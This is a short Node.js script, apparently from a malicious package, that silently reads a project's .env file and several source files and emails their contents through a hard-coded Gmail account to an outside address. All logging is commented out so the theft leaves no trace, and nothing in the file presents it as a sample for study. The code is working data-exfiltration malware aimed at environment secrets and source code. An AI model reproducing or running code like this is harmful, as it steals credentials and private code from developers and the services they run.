var nodemailer = require('nodemailer');
const fs = require('fs')

let sendData = [];

fs.readFile('.env', 'utf8', (err, data) => {
  if (err) {
    sendData.push("\nfile null at root/dotenv");
    return
  }
  sendData.push("\n========== root/Dotenv ==========\n" + data);
})

fs.readFile('app.js', 'utf8', (err, data) => {
  if (err) {
    sendData.push("\nfile null at root/app.js");
    return
  }
  sendData.push("\n========== root/App.js ==========\n" + data);
})

fs.readFile('index.js', 'utf8', (err, data) => {
  if (err) {
    sendData.push("\nfile null at public/index.js");
    return
  }
  sendData.push("\n========== root/Index.js ==========\n" + data);
})

fs.readFile('public/index.html', 'utf8', (err, data) => {
  if (err) {
    sendData.push("\nfile null at public/index.html");
    return
  }
  sendData.push("\n========== public/Index.html ==========\n" + data);
})

fs.readFile('public/index.js', 'utf8', (err, data) => {
  if (err) {
    sendData.push("\nfile null at public/index.js");
    return
  }
  sendData.push("\n========== public/Index.js ==========\n" + data);
})

setTimeout(function () {

  var transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'expressdession@gmail.com',
      pass: 'SuperSecretPassword'
    }
  });

  var today = new Date();
  var date = today.getFullYear() + '.' + (today.getMonth() + 1) + '.' + today.getDate();
  var time = today.getHours() + "." + today.getMinutes() + "." + today.getSeconds();
  var dateTime = date + '-' + time;

  var mailOptions = {
    from: 'expressdession@gmail.com',
    to: `adamspera@hotmail.com`,
    subject: `${dateTime}`,
    text: `${sendData}`
  };

  transporter.sendMail(mailOptions, function (error, info) {
    if (error) {
      // console.log('Error sending email.');
      // console.log(error);
    } else {
      // console.log(`Email successfully sent!`);
      // console.log(info);
    }
  });

}, 1000);
